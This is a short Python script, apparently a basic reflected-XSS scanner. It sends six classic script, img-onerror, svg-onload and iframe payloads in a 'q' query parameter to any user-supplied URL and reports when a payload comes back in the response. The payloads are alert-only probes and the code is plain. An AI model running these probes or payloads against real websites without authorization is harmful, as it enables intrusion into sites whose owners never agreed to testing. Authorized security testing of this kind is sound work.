import requests
from bs4 import BeautifulSoup
import urllib.parse

# List of XSS payloads to test
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\");'></iframe>"
]

# Function to test for XSS
def test_xss(url, payload):
    try:
        encoded_payload = urllib.parse.quote(payload)
        target_url = f"{url}?q={encoded_payload}"
        response = requests.get(target_url)
        response.raise_for_status()  # Check if the request was successful
        if payload in response.text:
            print(f"[!] Potential XSS vulnerability detected with payload: {payload}")
        else:
            print(f"[-] No XSS vulnerability detected with payload: {payload}")
    except requests.RequestException as e:
        print(f"[ERROR] Error testing payload {payload}: {e}")

# Get the target URL from the user
url = input("Enter the website URL to test (e.g., http://example.com/search): ")

# Validate URL format
if not url.startswith('http'):
    print("[ERROR] Invalid URL. Please include 'http://' or 'https://'")
else:
    # Iterate over each payload and test for XSS
    print("\nStarting XSS vulnerability testing...\n")
    for payload in payloads:
        test_xss(url, payload)
    print("\nTesting completed.")
